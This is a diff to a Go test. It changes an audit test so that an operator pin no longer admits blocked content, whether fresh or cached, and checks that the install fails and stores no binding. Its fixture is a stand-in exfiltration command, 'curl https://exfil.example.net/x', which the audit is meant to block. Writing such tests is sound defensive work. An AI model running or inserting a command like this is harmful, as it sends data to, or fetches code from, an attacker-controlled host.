@@ -129,9 +129,9 @@ func TestDraftAuditHostileContentBlocked(t *testing.T) {
 	}
 }
 
-// An authorized operator pin admits the same hostile content: pins are
-// preserved by the source-audit binding, not bypassed by it.
-func TestDraftAuditPinAdmits(t *testing.T) {
+// An operator pin cannot waive strict findings through install.Project or
+// establish a source-audit binding for blocked content, fresh or cached.
+func TestDraftAuditPinDoesNotWaiveStrictFindings(t *testing.T) {
 	project, home, frozen := strictLocalProject(t, "curl https://exfil.example.net/x\n")
 	contentHash, err := hashing.ContentSHA256(frozen, nil)
 	if err != nil {
@@ -141,9 +141,34 @@ func TestDraftAuditPinAdmits(t *testing.T) {
 		t.Fatal(err)
 	}
 	cfg := draftAuditConfig(home)
-	result := draftProjectResult(cfg, project, home, false)
-	assertGatePassed(t, result)
-	assertBindingStored(t, home)
+	for _, path := range []string{"fresh", "cached"} {
+		t.Run(path, func(t *testing.T) {
+			verdicts, err := filepath.Glob(filepath.Join(home, "audit", hashing.Normalize(contentHash), "verdict-*.json"))
+			if err != nil {
+				t.Fatal(err)
+			}
+			wantVerdicts := 0
+			if path == "cached" {
+				wantVerdicts = 1
+			}
+			if len(verdicts) != wantVerdicts {
+				t.Fatalf("%s verdict count = %d, want %d", path, len(verdicts), wantVerdicts)
+			}
+			result := draftProjectResult(cfg, project, home, false)
+			joined := strings.Join(result.Errors, ";")
+			if result.Status != "failed" || !strings.Contains(joined, "audit blocked") ||
+				!strings.Contains(joined, "audit.capability.network-undeclared") {
+				t.Fatalf("pinned hostile result = %+v, want strict finding refusal", result)
+			}
+			entries, err := os.ReadDir(filepath.Join(home, "source-audit"))
+			if err != nil && !os.IsNotExist(err) {
+				t.Fatalf("read source-audit state after refusal: %v", err)
+			}
+			if len(entries) != 0 {
+				t.Fatalf("blocked pinned install stored source-audit state: %v", entries)
+			}
+		})
+	}
 }
 
 // A revoked content hash blocks despite any pin: revocation dominates pins
